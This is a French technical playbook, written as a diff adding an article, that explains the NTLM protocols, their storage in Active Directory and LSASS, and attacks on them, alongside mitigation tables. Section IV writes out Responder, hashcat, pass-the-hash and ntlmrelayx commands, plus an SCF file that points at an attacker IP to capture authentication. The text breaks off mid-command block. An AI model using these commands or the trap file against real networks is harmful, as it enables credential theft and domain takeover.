@@ -1,0 +1,674 @@
+---
+title: "NTLM : Protocole, Internals et Attaques"
+date: "10-09-2026"
+tags:
+  [
+    "NTLM",
+    "NTLMv1",
+    "NTLMv2",
+    "Pass-the-Hash",
+    "NTLM Relay",
+    "Responder",
+    "Challenge-Response",
+    "Active Directory",
+    "Windows Internals",
+    "Défense",
+    "Event IDs",
+    "Coercion",
+    "MIC",
+    "EPA",
+  ]
+category: "playbooks"
+lang: "fr"
+description: "Référence technique complète sur NTLM : histoire du protocole (LM, NTLMv1, NTLMv2), mécanique du challenge-response, intégration dans Active Directory, attaques offensives majeures (Pass-the-Hash, NTLM Relay, Capture NTLMv2, Coercition d'authentification) et stratégies de détection défensive."
+---
+
+## Introduction
+
+NTLM est le protocole d'authentification challenge-response propriétaire de Microsoft. Apparu avec LAN Manager dans les années 80, il a traversé trois générations successives (LM, NTLMv1, NTLMv2) avant d'être théoriquement supplanté par Kerberos à partir de Windows 2000. Théoriquement.
+
+En pratique, NTLM est toujours omniprésent dans tout environnement Windows moderne. Il intervient dès qu'un compte se connecte par adresse IP plutôt que par nom DNS, dès qu'un service n'est pas enregistré dans le KDC Kerberos, dès que le client demande à se connecter à une machine hors domaine, ou dès qu'une configuration force son usage. Dans un engagement Active Directory, NTLM est inévitable.
+
+Comme pour notre playbook Kerberos, cet article ne liste pas des syntaxes d'outils. Il pose les bases du protocole, **qui envoie quoi, qui chiffre quoi, quelle clé intervient, et pourquoi l'attaque fonctionne**, afin que les techniques offensives détaillées dans nos labs soient comprises mécaniquement, pas mémorisées.
+
+Référence : [MS-NLMP - NT LAN Manager (NTLM) Authentication Protocol Specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)
+
+---
+
+## Schéma Conceptuel : Les Trois Générations NTLM
+
+```
+LAN Manager (LM)        NTLMv1               NTLMv2
+────────────────        ──────────────────    ──────────────────────
+Hash : DES x2           Hash : MD4 (NT hash)  Hash : HMAC-MD5
+Sel  : aucun            Sel  : aucun           Sel  : challenge client + timestamp
+Clé  : 7+7 octets       Clé  : 16 octets       Clé  : hash NT + username + domain
+Split: oui (2 DES)      Split: oui (3 DES)     Split: non
+Statut: obsolète        Statut: obsolète       Statut: standard actuel
+```
+
+---
+
+## I. Les Algorithmes de Hachage : LM, NT, NTLMv1, NTLMv2
+
+Avant d'aborder le protocole lui-même, il faut distinguer quatre notions souvent confondues.
+
+### 1.1 Le Hash LM (LAN Manager)
+
+Le hash LM est le mécanisme d'authentification hérité de LAN Manager, introduit en 1987. Il est fondamentalement cassable par construction.
+
+Référence : [Wikipedia - LAN Manager Hash](https://en.wikipedia.org/wiki/LAN_Manager#LM_hash_details)
+
+- Le mot de passe est tronqué ou paddé à **14 caractères maximum**, et converti en **majuscules** (ce qui réduit l'espace des caractères possibles de 95 caractères ASCII imprimables à 69, les 26 minuscules devenant redondantes).
+- Il est ensuite **découpé en deux blocs de 7 octets**, chacun utilisé comme clé DES pour chiffrer la constante magique `KGS!@#$%` (8 octets ASCII) en mode ECB.
+- Chaque bloc de 7 octets est étendu à 8 octets par insertion d'un bit de parité tous les 7 bits pour former une clé DES standard de 56 bits effectifs.
+- Le résultat est la **concaténation des deux chiffrés DES** (2 × 8 = 16 octets au total).
+
+```
+Password123 → PASSWORD123\x00\x00\x00 (paddé à 14 octets, uppercasé)
+                    ↓
+              PASSWOR (7 octets)  +  D123\x00\x00\x00 (7 octets)
+                    ↓                        ↓
+       DES_ECB(k1, "KGS!@#$%")    DES_ECB(k2, "KGS!@#$%")
+                    ↓                        ↓
+              hash_lm = cipher1 ‖ cipher2 (16 octets)
+```
+
+Ce découpage en deux moitiés indépendantes est catastrophique : il divise l'espace de recherche en permettant de casser chaque moitié séparément. Si le mot de passe fait 7 caractères ou moins, la seconde moitié est toujours `AAD3B435B51404EE` (chiffrement DES de 7 octets nuls sur la constante `KGS!@#$%`), immédiatement reconnaissable.
+
+> [!WARNING]
+> Un hash LM dont la seconde moitié vaut `AAD3B435B51404EE` trahit immédiatement un mot de passe de 7 caractères ou moins. Par convention, Windows stocke `AAD3B435B51404EEAAD3B435B51404EE` (16 octets affichés en 32 caractères hexadécimaux) pour signifier que le hash LM est désactivé, ce qui est la valeur par défaut depuis Windows Vista/Server 2008.
+
+Référence : [Microsoft - LAN Manager authentication level](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level)
+
+### 1.2 Le Hash NT (NTLM Hash)
+
+Le hash NT est la version moderne du hash local Windows. Il est calculé par la fonction `NTOWF` (NT One-Way Function) définie dans MS-NLMP :
+
+```
+NT Hash = MD4( UTF-16LE(password) )
+```
+
+- Pas de troncature, pas de conversion en majuscules, pas de limite de longueur.
+- Sensible à la casse.
+- **Pas de sel** (salt).
+- **16 octets (128 bits)**.
+
+Référence : [MS-NLMP §3.3.1 - NTOWF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)
+
+C'est ce hash qui est stocké dans la SAM (comptes locaux), dans `ntds.dit` (comptes de domaine), et qui est conservé en mémoire par le SSP `MSV1_0` dans LSASS. C'est lui qui est utilisé comme matériel de base dans NTLMv1 et NTLMv2.
+
+L'absence de sel a une conséquence directe : deux utilisateurs avec le même mot de passe auront le même hash NT, sur n'importe quelle machine, dans n'importe quel domaine. C'est ce qui rend les **Pass-the-Hash** possibles : un attaquant n'a jamais besoin du mot de passe en clair, le hash est un équivalent fonctionnel du mot de passe pour toute authentification NTLM.
+
+### 1.3 NTLMv1 (Net-NTLMv1)
+
+NTLMv1 est la réponse réseau construite à partir du hash NT. Il ne faut pas le confondre avec le hash NT lui-même : NTLMv1 est le matériel échangé sur le réseau lors d'un challenge-response, pas quelque chose stocké sur disque.
+
+Référence : [MS-NLMP §3.3.1 - NTLMv1 Authentication](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)
+
+La construction se déroule en quatre étapes :
+
+1. Le hash NT de 16 octets est **paddé avec 5 octets nuls** (`0x00`) pour atteindre 21 octets.
+2. Ces 21 octets sont **découpés en trois blocs de 7 octets** ($K_1$, $K_2$, $K_3$).
+3. Chaque bloc de 7 octets est étendu en clé DES de 8 octets (insertion de bits de parité).
+4. Chaque clé chiffre indépendamment le **Server Challenge de 8 octets** en mode DES-ECB.
+5. Les trois chiffrés de 8 octets sont **concaténés** pour former la réponse finale de **24 octets**.
+
+```
+NT_Hash (16 octets) + 0x0000000000 (5 octets) = 21 octets
+        ↓
+K1 = octets[0:7]    K2 = octets[7:14]    K3 = octets[14:21]
+        ↓                    ↓                    ↓
+DES(K1, Challenge)   DES(K2, Challenge)   DES(K3, Challenge)
+        ↓                    ↓                    ↓
+   C1 (8 octets)      C2 (8 octets)       C3 (8 octets)
+        ↓
+Réponse NTLMv1 = C1 ‖ C2 ‖ C3 (24 octets)
+```
+
+Ce découpage en trois opérations DES indépendantes est catastrophique pour la sécurité :
+
+- **$K_3$ est prédictible** : il ne contient que les 2 derniers octets du hash NT suivis de 5 octets nuls. Cela réduit son espace de clé à seulement $2^{16}$ possibilités (65 536), cassable en millisecondes.
+- **Chaque clé DES est indépendante** : un attaquant peut brute-forcer $K_1$, $K_2$ et $K_3$ séparément au lieu d'attaquer les 128 bits du hash NT d'un coup.
+- Des services spécialisés comme [crack.sh](https://crack.sh/) exploitent des rainbow tables DES précalculées pour reconstituer le hash NT complet à partir d'une capture NTLMv1 en quelques secondes.
+
+Référence : [Praetorian - NTLMv1 Downgrade and Crack.sh](https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/)
+
+> [!WARNING]
+> NTLMv1 ne doit plus être autorisé dans aucun environnement. Le paramètre GPO `Network security: LAN Manager authentication level` doit être configuré au minimum sur **Send NTLMv2 response only. Refuse LM & NTLM** (niveau 5). Si un attaquant parvient à downgrader la négociation vers NTLMv1 (via Responder avec `--lm` par exemple), le hash NT peut être reconstitué intégralement, annulant la protection apportée par HMAC-MD5 dans NTLMv2.
+
+### 1.4 NTLMv2 (Net-NTLMv2)
+
+NTLMv2 est le standard actuel, introduit dans Windows NT 4.0 SP4. La construction est fondamentalement différente de NTLMv1 et utilise la fonction `NTOWFv2` définie dans MS-NLMP :
+
+Référence : [MS-NLMP §3.3.2 - NTLMv2 Authentication](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)
+
+```
+ResponseKeyNT = HMAC-MD5( NT_Hash, UNICODE(Uppercase(Username) + UserDom) )
+
+blob = Client_Challenge (8 octets aléatoires) + Timestamp (8 octets) + Target_Info + ...
+
+NTLMv2_Response = HMAC-MD5( ResponseKeyNT, Server_Challenge + blob )
+```
+
+**Point critique sur la casse (source d'erreur fréquente)** : selon la spécification MS-NLMP (fonction `NTOWFv2`), **seul le nom d'utilisateur est converti en majuscules**. Le nom de domaine (`UserDom`) **conserve sa casse d'origine** telle que fournie par le serveur dans le champ `TargetName` du `CHALLENGE_MESSAGE`. C'est une distinction importante pour le cracking et la reproduction manuelle de la dérivation.
+
+Trois améliorations critiques par rapport à NTLMv1 :
+
+1. **Un challenge côté client** (`Client_Challenge`, 8 octets aléatoires) est intégré dans le calcul avec un **horodatage** (timestamp Windows FILETIME, 8 octets). Cela signifie que deux captures du même utilisateur sur le même serveur produiront des réponses différentes.
+2. **La clé de dérivation intègre le nom d'utilisateur (en majuscules) et le domaine**, ce qui empêche de réutiliser une réponse capturée d'un utilisateur pour un autre.
+3. **Le blob `Target_Info` contient des métadonnées du serveur** (nom NetBIOS, nom DNS, horodatage du serveur, flags MIC), ce qui lie la réponse au contexte exact de la session.
+
+NTLMv2 reste crackable offline (Hashcat mode `5600`), mais c'est un calcul HMAC-MD5 avec un sel. Sur un mot de passe robuste, la capture NTLMv2 résiste aux attaques par dictionnaire.
+
+```bash
+# Crack NTLMv2 capturée (Responder)
+hashcat -m 5600 ntlmv2.txt rockyou.txt
+```
+
+---
+
+## II. Le Mécanisme Challenge-Response : Qui Envoie Quoi
+
+Le handshake NTLM se déroule en trois messages, définis dans [MS-NLMP §2.2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/). Il s'applique identiquement en local (SAM) et en réseau (Netlogon, SMB, HTTP, LDAP...).
+
+```
+Client                             Serveur / DC
+──────                             ────────────
+NEGOTIATE_MESSAGE   ─────────────▶
+                    ◀─────────────  CHALLENGE_MESSAGE  (Server_Challenge 8 octets)
+AUTHENTICATE_MSG    ─────────────▶  (NTLMv2 Response + Username + Domain + Client_Challenge)
+                    ◀─────────────  [Session établie ou ACCESS_DENIED]
+```
+
+### 2.1 NEGOTIATE_MESSAGE (Type 1)
+
+Le client annonce ses capacités : versions NTLM supportées, flags de sécurité négociés (`NTLMSSP_NEGOTIATE_56`, `NTLMSSP_NEGOTIATE_128`, `NTLMSSP_NEGOTIATE_NTLM`, `NTLMSSP_NEGOTIATE_SIGN`, `NTLMSSP_NEGOTIATE_SEAL`, etc.). Ce message est en clair et sert uniquement à la négociation initiale.
+
+Référence : [MS-NLMP §2.2.1.1 - NEGOTIATE_MESSAGE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)
+
+### 2.2 CHALLENGE_MESSAGE (Type 2)
+
+Le serveur génère un **challenge aléatoire de 8 octets** (`ServerChallenge`) et le renvoie au client accompagné de :
+
+- Son nom NetBIOS et nom DNS (`TargetName`).
+- Ses flags de sécurité négociés.
+- La structure `TargetInfo` contenant les `AV_PAIR` (attributs du serveur : `MsvAvNbDomainName`, `MsvAvDnsDomainName`, `MsvAvTimestamp`, `MsvAvFlags`).
+
+Ce challenge est éphémère et unique à chaque session, il ne peut pas être réutilisé.
+
+Référence : [MS-NLMP §2.2.1.2 - CHALLENGE_MESSAGE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)
+
+### 2.3 AUTHENTICATE_MESSAGE (Type 3)
+
+Le client construit la réponse NTLMv2 :
+
+```
+1. ResponseKeyNT = HMAC-MD5( NT_Hash, UNICODE(Uppercase(Username) + UserDom) )
+2. blob = ClientChallenge (8 octets) + Timestamp + TargetInfo + ...
+3. NTProofStr = HMAC-MD5( ResponseKeyNT, ServerChallenge + blob )
+4. NtChallengeResponse = NTProofStr ‖ blob
+5. SessionBaseKey = HMAC-MD5( ResponseKeyNT, NTProofStr )
+```
+
+Le message contient : `Username`, `DomainName`, `NtChallengeResponse`, `LmChallengeResponse`, `EncryptedRandomSessionKey`, et optionnellement le **MIC** (voir section II.5).
+
+Référence : [MS-NLMP §2.2.1.3 - AUTHENTICATE_MESSAGE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)
+
+Le serveur reçoit tout ça et recalcule lui-même la réponse attendue à partir du hash NT de l'utilisateur stocké localement (ou transmis via Netlogon au DC). Si `NTProofStr` correspond, l'authentification réussit.
+
+> [!NOTE]
+> Le serveur ne connaît **jamais** le mot de passe en clair. Il ne connaît que le hash NT (ou demande au DC de vérifier via Netlogon). Le mot de passe n'est jamais transmis sur le réseau, ni en clair, ni chiffré. Seule la réponse dérivée voyage.
+
+### 2.4 Pass-Through Authentication (Netlogon)
+
+Quand un serveur membre du domaine reçoit une authentification NTLM pour un compte de domaine, il ne peut pas vérifier lui-même (il ne stocke pas les hash NT des comptes domaine). Il transmet donc le challenge, la réponse, et le nom d'utilisateur au contrôleur de domaine via **MS-NRPC (Netlogon Remote Protocol)**, un canal chiffré et authentifié (`Secure Channel`) entre le serveur et le DC. Le DC vérifie dans `ntds.dit` et répond `OK` ou `FAIL`.
+
+Référence : [MS-NRPC - Netlogon Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/)
+
+```
+Client ──[NTLM Auth]──▶ Serveur Membre
+                             │
+                             │ MS-NRPC: NetrLogonSamLogonWithFlags(
+                             │   ServerChallenge, NtChallengeResponse, Username, Domain)
+                             ▼
+                         Contrôleur de Domaine (ntds.dit)
+                             │
+                             │ STATUS_SUCCESS ou STATUS_WRONG_PASSWORD
+                             ▼
+                        Serveur Membre ──▶ Client (session établie ou refusée)
+```
+
+> [!IMPORTANT]
+> Le serveur membre agit comme un **relais passif** dans ce processus : il transmet la vérification au DC sans la valider lui-même. Mais attention : cela ne signifie pas que le relay est trivial. Le serveur doit disposer d'un Secure Channel valide avec le DC pour effectuer la vérification. Ce qui rend le NTLM Relay possible, c'est que le serveur ne vérifie pas que le client qui s'authentifie est bien celui qui a initié la connexion réseau (pas d'authentification mutuelle côté NTLM).
+
+### 2.5 Le MIC (Message Integrity Code)
+
+À partir de Windows 10 et Server 2016, le `AUTHENTICATE_MESSAGE` peut inclure un champ **MIC** (Message Integrity Code) de 16 octets, calculé comme :
+
+```
+MIC = HMAC-MD5( SessionBaseKey, NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE )
+```
+
+Le MIC couvre l'intégralité des trois messages du handshake. Si un attaquant en position MitM modifie les flags de négociation (par exemple pour supprimer les flags de signature ou forcer un downgrade de sécurité), le MIC sera invalide et le serveur rejettera l'authentification.
+
+Référence : [MS-NLMP §3.1.5.1.2 - MIC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)
+
+> [!WARNING]
+> La vulnérabilité **CVE-2019-1040** (« Drop the MIC »), découverte par les chercheurs de Preempt (aujourd'hui CrowdStrike), a démontré qu'un attaquant pouvait **supprimer le MIC** d'un message NTLM relayé sans que le serveur cible ne le rejette, car la vérification du MIC n'était pas obligatoire lorsque certains flags (`NTLMSSP_NEGOTIATE_SIGN`) étaient absents. Cela permettait du relay cross-protocole (SMB → LDAP) même sur des systèmes récents. Le correctif Microsoft de juin 2019 renforce la vérification côté serveur.
+>
+> Référence : [Preempt/CrowdStrike - Drop the MIC (CVE-2019-1040)](https://www.crowdstrike.com/blog/active-directory-ntlm-attack/)
+
+---
+
+## III. NTLM dans Active Directory
+
+### 3.1 Quand NTLM est utilisé plutôt que Kerberos
+
+Kerberos est le protocole préféré dans un domaine Active Directory, mais NTLM prend automatiquement le relais dans les situations suivantes :
+
+Référence : [Microsoft - NTLM Overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview)
+
+| Situation                                         | Raison                                                                   |
+| ------------------------------------------------- | ------------------------------------------------------------------------ |
+| Connexion par **adresse IP**                      | Kerberos nécessite un nom d'hôte pour construire le SPN, pas une IP      |
+| Service sans **SPN enregistré**                   | Pas de ticket TGS possible                                               |
+| Machine **hors domaine**                          | Pas de KDC accessible                                                    |
+| Machine **non joignable sur Kerberos** (port 88)  | Fallback automatique                                                     |
+| Authentification depuis **internet ou DMZ**       | Pas de route vers le KDC interne                                         |
+| **NTLM forcé** par la configuration               | Stratégie de groupe `Network security: LAN Manager authentication level` |
+| Authentification vers **localhost** (127.0.0.1)   | Toujours NTLM, pas de SPN résolvable                                     |
+| Client **pré-Windows 2000** ou application legacy | Pas de support Kerberos côté client                                      |
+| Authentification **NTLM over HTTP** (IIS/ADCS)    | Certains services web n'implémentent que NTLM via SPNEGO                 |
+
+> [!NOTE]
+> Il existe une exception notable : depuis Windows 10, il est possible d'enregistrer des SPN basés sur des adresses IP (`HOST/10.1.2.3`) pour permettre l'authentification Kerberos par IP. Cependant, cette configuration n'est pas activée par défaut et reste rare en production.
+>
+> Référence : [Microsoft - Kerberos client allow IPv4 and IPv6 address hostnames in SPNs](https://learn.microsoft.com/en-us/windows-server/security/kerberos/configuring-kerberos-over-ip)
+
+### 3.2 Les Hash NT dans ntds.dit
+
+Dans un domaine Active Directory, les hash NT de tous les comptes sont stockés dans `ntds.dit`, la base de données Active Directory hébergée sur les contrôleurs de domaine. `ntds.dit` contient :
+
+- Le **hash NT** du compte (version actuelle du mot de passe).
+- L'**historique des hash NT** (si la politique d'historique de mots de passe est activée, attribut `ntPwdHistory`).
+- Les **hash LM** (désactivés par défaut depuis Windows Vista, mais présents si la GPO `Network security: Do not store LAN Manager hash value on next password change` n'est pas activée).
+- Les **clés Kerberos** (DES, RC4/NTLM, AES128, AES256) dérivées du mot de passe avec un sel Kerberos (`REALM + sAMAccountName`), stockées dans l'attribut `supplementalCredentials`.
+
+Référence : [Microsoft - Active Directory Schema - supplementalCredentials](https://learn.microsoft.com/en-us/windows/win32/adschema/a-supplementalcredentials) | [Synacktiv - Windows Secrets Extraction, a Summary](https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary)
+
+La SAM (Security Account Manager), quant à elle, ne stocke que les hash des **comptes locaux** de la machine. Elle est située dans le fichier `C:\Windows\System32\config\SAM` et protégée par le boot key (SYSKEY).
+
+> [!IMPORTANT]
+> Il n'y a **pas de sel** dans les hash NT stockés dans `ntds.dit` ni dans la SAM. Deux comptes avec le même mot de passe, même sur des machines différentes et dans des domaines différents, auront le même hash NT. C'est pourquoi un DCSync (obtention de tous les hash NT du domaine via la réplication DRS, Event ID `4662`) est aussi dévastateur : chaque hash peut être directement utilisé en Pass-the-Hash.
+
+### 3.3 Stockage NTLM en mémoire (LSASS)
+
+Le SSP `MSV1_0` (chargé dans `lsass.exe`) conserve les credentials des utilisateurs ayant une session interactive active. Selon la version de Windows et la configuration, LSASS peut stocker :
+
+| Donnée                              | Condition de stockage                                                 |
+| ----------------------------------- | --------------------------------------------------------------------- |
+| **Hash NT**                         | Toujours stocké (sauf Credential Guard ou Protected Users)            |
+| **Mot de passe en clair** (WDigest) | Stocké si `UseLogonCredential = 1` dans le registre (défaut < Win8.1) |
+| **Tickets Kerberos** (TGT, TGS)     | Stockés par le SSP Kerberos                                           |
+| **Hash LM**                         | Stocké si LM est activé (rare)                                        |
+
+Référence : [Microsoft - Configuring Additional LSA Protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) | [Gentilkiwi/Mimikatz - MSV Provider](https://github.com/gentilkiwi/mimikatz)
+
+C'est ce hash NT en mémoire qui est extrait lors d'un dump LSASS (via Mimikatz `sekurlsa::logonpasswords`, ProcDump + pypykatz, ou nanodump). Il est nécessaire pour répondre aux futurs challenges NTLM sans re-demander le mot de passe à l'utilisateur (SSO).
+
+---
+
+## IV. Attaques Offensives
+
+### 4.1 Capture NTLMv2 (Responder / LLMNR-NBT-NS-mDNS Poisoning)
+
+**Principe** : NTLM transmet la réponse NTLMv2 du client sur le réseau. Ce n'est pas le hash NT brut, mais une dérivation crackable offline. Si un attaquant peut se faire passer pour le serveur ciblé, il reçoit cette réponse.
+
+**Mécanisme d'exploitation** : Windows utilise une cascade de protocoles de résolution de noms quand le DNS échoue. Chacun de ces protocoles fait confiance à la première réponse reçue, sans authentification :
+
+| Protocole  | Port / Transport     | Portée              | Référence                                                         |
+| ---------- | -------------------- | ------------------- | ----------------------------------------------------------------- |
+| **LLMNR**  | UDP 5355 (multicast) | Lien local (subnet) | [RFC 4795 - LLMNR](https://www.rfc-editor.org/rfc/rfc4795)        |
+| **NBT-NS** | UDP 137 (broadcast)  | Broadcast domaine   | [RFC 1001/1002 - NetBIOS](https://www.rfc-editor.org/rfc/rfc1001) |
+| **mDNS**   | UDP 5353 (multicast) | Lien local (subnet) | [RFC 6762 - mDNS](https://www.rfc-editor.org/rfc/rfc6762)         |
+
+```
+Victime : "Qui est \\FILESERVER ?"   ──[broadcast/multicast]──▶
+                                               ◀── Attaquant (Responder) : "C'est moi !"
+Victime : [NTLM NEGOTIATE] ──────────────────────────────▶ Attaquant
+Attaquant : [NTLM CHALLENGE] ◀───────────────────────────── Victime
+Victime : [NTLM AUTHENTICATE - NTLMv2 Response] ─────────▶ Attaquant
+```
+
+Responder se positionne sur le réseau local, répond à toutes les requêtes LLMNR, NBT-NS et mDNS, et collecte les réponses NTLMv2. Ces réponses sont ensuite crackées offline avec Hashcat (mode `5600`).
+
+```bash
+# Positionnement
+sudo responder -I eth0 -wFv
+
+# Format capturé
+[SMB] NTLMv2 Hash : jdoe::MEGACORP:aabbccdd...:4f2e...:010100000000...
+```
+
+```bash
+# Crack offline
+hashcat -m 5600 hash.txt rockyou.txt
+```
+
+**Conditions** : réseau local, LLMNR/NBT-NS/mDNS activés (défaut Windows), une machine victime qui tente de résoudre un nom inexistant ou mal orthographié.
+
+Référence : [SpiderLabs/Responder (GitHub)](https://github.com/SpiderLabs/Responder) | [The Hacker Recipes - LLMNR/NBT-NS/mDNS Poisoning](https://www.thehacker.recipes/ad/movement/mitm/llmnr-nbt-ns-mdns-spoofing)
+
+### 4.2 Coercition d'Authentification NTLM (Forced Authentication)
+
+Plutôt que d'attendre qu'une victime tente une résolution de nom incorrecte, on peut **forcer** l'authentification NTLM en déclenchant une connexion sortante depuis la machine cible vers un serveur contrôlé. Deux grandes catégories :
+
+#### 4.2.1 Fichiers piégés (interaction utilisateur requise)
+
+On insère un chemin UNC piégé dans un fichier que la victime va ouvrir ou simplement prévisualiser. Windows tente automatiquement d'accéder à la ressource et envoie une authentification NTLM sans intervention de l'utilisateur.
+
+| Vecteur               | Mécanisme                                                                       | Outil / Référence                                  |
+| --------------------- | ------------------------------------------------------------------------------- | -------------------------------------------------- |
+| **Fichier SCF**       | Attribut `IconFile=\\ATTACKER\x\icon.ico` lu par Windows Explorer à l'affichage | [hashgrab](https://github.com/xct/hashgrab)        |
+| **Fichier .url/.lnk** | Cible ou icône pointant vers un chemin UNC                                      | Natif Windows                                      |
+| **desktop.ini**       | `IconResource=\\ATTACKER\x\icon.ico` dans un dossier                            | Natif Windows                                      |
+| **Document ODT/DOCX** | Image/objet OLE référençant un chemin UNC réseau                                | [odt_badodt](https://github.com/elweth-sec/BadODT) |
+| **Fichier HTML/SVG**  | Balise `<img src="\\ATTACKER\x\img.jpg">` ou CSS `url()`                        | Navigateurs legacy                                 |
+
+Exemple d'un fichier SCF (utilisé dans les labs ShareThePain et Shadowgate 2) :
+
+```ini
+[Shell]
+Command=2
+IconFile=\\10.200.85.175\share\scf.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+#### 4.2.2 Coercition machine (sans interaction utilisateur)
+
+Des fonctions RPC exposées par Windows permettent de forcer un serveur (y compris un contrôleur de domaine) à effectuer une authentification NTLM sortante vers une cible arbitraire :
+
+| Technique        | Fonction RPC / Interface                                | Outil                                                        | CVE / Référence                      |
+| ---------------- | ------------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------ |
+| **PetitPotam**   | `EfsRpcOpenFileRaw` (MS-EFSR)                           | [PetitPotam](https://github.com/topotam/PetitPotam)          | CVE-2021-36942                       |
+| **PrinterBug**   | `RpcRemoteFindFirstPrinterChangeNotification` (MS-RPRN) | [printerbug.py](https://github.com/dirkjanm/krbrelayx)       | Par conception (feature, pas un bug) |
+| **DFSCoerce**    | `NetrDfsRemoveStdRoot` (MS-DFSNM)                       | [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)          | -                                    |
+| **ShadowCoerce** | `IsPathShadowCopied` (MS-FSRVP)                         | [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) | -                                    |
+
+Référence : [The Hacker Recipes - Coerced Authentications](https://www.thehacker.recipes/ad/movement/mitm/coerced-authentications)
+
+> [!TIP]
+> La coercition est particulièrement dévastatrice lorsqu'elle est combinée au NTLM Relay vers LDAP (pour du RBCD ou Shadow Credentials) ou vers ADCS (ESC8). Un contrôleur de domaine qui s'authentifie en NTLM vers un attaquant permet d'obtenir un certificat machine ou de modifier l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`, menant directement à la compromission du domaine.
+
+### 4.3 Pass-the-Hash (PtH)
+
+**Principe fondamental** : le hash NT _est_ l'équivalent fonctionnel du mot de passe pour toute authentification NTLM. Puisque le protocole n'utilise jamais le mot de passe en clair (seulement des dérivations du hash NT), un attaquant qui possède le hash NT peut s'authentifier directement sans connaître le mot de passe.
+
+Référence : [Microsoft - Mitigating Pass-the-Hash Attacks](https://www.microsoft.com/en-us/download/details.aspx?id=36036)
+
+```
+Attaquant : possède NT_Hash de jdoe (extrait de SAM / LSASS / ntds.dit)
+            ↓
+Authentification NTLM :
+  ResponseKeyNT = HMAC-MD5( NT_Hash, UNICODE(Uppercase("JDOE") + "MEGACORP") )
+  NTProofStr    = HMAC-MD5( ResponseKeyNT, ServerChallenge + blob )
+            ↓
+Le serveur valide : NTProofStr est correct → session établie
+```
+
+Le hash NT suffit à construire la réponse NTLMv2 complète. L'outil ne demande pas de mot de passe.
+
+```bash
+# Avec impacket
+impacket-wmiexec -hashes :NTHash DOMAIN/user@target
+
+# Avec NetExec
+nxc smb 192.168.1.0/24 -u Administrator -H NTHash
+
+# Avec Evil-WinRM
+evil-winrm -i target -u user -H NTHash
+```
+
+> [!WARNING]
+> Pass-the-Hash **ne fonctionne pas contre Kerberos**. Si la cible force l'authentification Kerberos (par exemple via le groupe Protected Users), le hash NT seul ne suffit plus. Cependant, le hash NT peut être utilisé pour dériver les clés Kerberos RC4 (car RC4-HMAC utilise directement le hash NT comme clé) via **Overpass-the-Hash** (ou Pass-the-Key) : `getTGT.py -hashes :NTHash domain/user`. En pratique, si la cible accepte NTLM (par défaut dans tout environnement Windows), PtH fonctionne.
+
+**Limites dans les environnements modernes** :
+
+| Mécanisme de défense                         | Impact sur PtH                                                                                 | Référence                                                                                                                                                           |
+| -------------------------------------------- | ---------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `LocalAccountTokenFilterPolicy = 0` (défaut) | PtH avec comptes locaux non-RID 500 limité à un jeton filtré (pas d'accès admin distant)       | [Microsoft - UAC Remote Restrictions](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)   |
+| Comptes protégés (Protected Users)           | NTLM bloqué côté DC, pas de hash NT mis en cache sur le endpoint. PtH impossible               | [Microsoft - Protected Users Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) |
+| Credential Guard                             | Hash NT isolé dans un conteneur VBS (`LSAIso.exe`), inaccessible aux outils de dump classiques | [Microsoft - Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)                                            |
+| SMB Signing                                  | PtH fonctionne toujours, mais le **relay** (section 4.4) est bloqué                            | [Microsoft - SMB Signing](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing)                           |
+
+### 4.4 NTLM Relay
+
+**Principe** : Au lieu de craquer la réponse NTLMv2 capturée, l'attaquant la **relaie en temps réel** vers un autre serveur. La victime s'authentifie contre l'attaquant, l'attaquant s'authentifie contre la cible, la session s'établit avec les droits de la victime sur la cible.
+
+Référence : [The Hacker Recipes - NTLM Relay](https://www.thehacker.recipes/ad/movement/ntlm/relay) | [SecureAuth/Impacket - ntlmrelayx](https://github.com/fortra/impacket)
+
+```
+Victime ──[NTLM Auth]──▶ Attaquant (ntlmrelayx)
+                              │
+                              │ [Relai du CHALLENGE du serveur cible vers la victime]
+                              │ [Relai de l'AUTHENTICATE de la victime vers la cible]
+                              ▼
+                          Cible (SMB/LDAP/HTTP/MSSQL/...)
+                              │
+                              │ [Session établie avec les droits de la victime]
+                              ▼
+                         Attaquant : exécution, écriture, dump, modification ACL...
+```
+
+C'est une attaque MitM en temps réel : la réponse NTLMv2 capturée n'est pas crackée, elle est simplement retransmise. L'attaquant n'a jamais besoin du mot de passe ou du hash.
+
+```bash
+# Responder avec SMB et HTTP désactivés (pour éviter les conflits avec ntlmrelayx)
+# Modifier Responder.conf : SMB = Off, HTTP = Off
+sudo responder -I eth0 -wFv
+
+# ntlmrelayx en écoute, cible une liste de serveurs SMB sans signing
+impacket-ntlmrelayx -tf smb_targets.txt -smb2support
+
+# Avec exécution de commande
+impacket-ntlmrelayx -tf smb_targets.txt -smb2support -c "whoami"
+
+# Relay vers LDAP pour ajouter un compte ou configurer RBCD
